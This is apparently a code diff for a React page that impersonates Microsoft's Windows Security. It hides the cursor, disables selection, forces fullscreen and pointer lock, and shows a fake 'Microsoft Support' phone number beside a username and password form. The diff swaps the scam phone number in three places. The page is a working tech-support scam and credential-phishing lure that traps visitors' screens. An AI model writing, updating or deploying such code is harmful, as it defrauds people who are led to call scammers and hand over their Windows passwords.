@@ -3,9 +3,8 @@ import '../../assets/css/microsoft.css';
 import { FaBell, FaCog, FaQuestionCircle } from 'react-icons/fa';
 import SecondContainer from "../../assets/components/second-container";
 import ThirdContainer from "../../assets/components/third-container";
-
 const globalCursorHide = `
-    html, body, #root, .fake-desktop {
+    html, body, #root, .fake-desktop {  
         cursor: none !important;
         user-select: none !important;
     }
@@ -34,7 +33,6 @@ function Microsoft() {
     const [fullscreenOverlay, setFullscreenOverlay] = useState(false);
     const [_lockLostOverlay] = useState(false);
     const [hasShownEscHint, setHasShownEscHint] = useState(false);
-
     const rootDivRef = useRef<HTMLDivElement>(null);
     const ctrlDownRef = useRef(false);
     const isTryingToLock = useRef(false);
@@ -353,7 +351,6 @@ function Microsoft() {
             enterFullScreen();
             lockPointer();
 
-            // Dispatch keyboard event to trigger fullscreen handlers
             const keyEvent = new KeyboardEvent('keydown', {
                 key: 'a',
                 code: 'KeyA',
@@ -469,13 +466,14 @@ function Microsoft() {
 
             <SecondContainer />
             <ThirdContainer />
+            
 
             <footer className="page-footer">
                 <div className="footer-top">
                     <img src="/microsoft/logo.webp" alt="Windows Logo" className="footer-logo" />
                     <span>Windows Security</span>
                     <span>Microsoft Support</span>
-                    <span className="footer-phone">+1-866-520-3159</span>
+                    <span className="footer-phone">+1-866-520-1921</span>
                 </div>
 
                 <div style={{
@@ -505,7 +503,7 @@ function Microsoft() {
                         </div>
                         <div style={{ color: '#0067c5' }}>Microsoft Support</div>
                         <div style={{ color: '#d32f2f', fontSize: '24px', fontWeight: 'bold', marginTop: '8px' }}>
-                            +1-866-520-3159
+                            +1-866-520-1921
                         </div>
 
                         <div style={{
@@ -561,7 +559,7 @@ function Microsoft() {
                                 Try logging in again with your Windows account and password.
                                 If you need help, contact Windows Support.
                             </p>
-                            <div className="phone-large">+1-866-520-3159</div>
+                            <div className="phone-large">+1-866-520-1921</div>
                             <div className="form">
                                 <input type="text" placeholder="Username" />
                                 <input type="password" placeholder="Password" />
